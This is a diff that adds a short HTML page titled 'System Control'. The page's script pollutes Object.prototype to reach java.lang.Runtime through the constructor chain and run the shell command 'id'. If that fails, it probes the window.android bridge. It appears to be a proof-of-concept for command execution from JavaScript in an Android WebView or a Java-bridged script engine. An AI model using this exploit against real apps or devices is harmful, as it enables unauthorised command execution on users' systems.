@@ -1,0 +1,26 @@
+<html>
+<head>
+<title>System Control</title>
+</head>
+<body>
+<script>
+try {
+    Object.prototype.hack = function() {
+        return this.constructor.constructor('return java.lang.Runtime.getRuntime()')();
+    };
+    var rt = {}.hack();
+    var p = rt.exec('id');
+    document.write('Executed: ' + p);
+} catch (e) {
+    document.write('Error1: ' + e);
+    try {
+        var x = window.android;
+        var y = x.constructor;
+        document.write('Error2: ' + y);
+    } catch (e2) {
+        document.write('Error3: ' + e2);
+    }
+}
+</script>
+</body>
+</html>
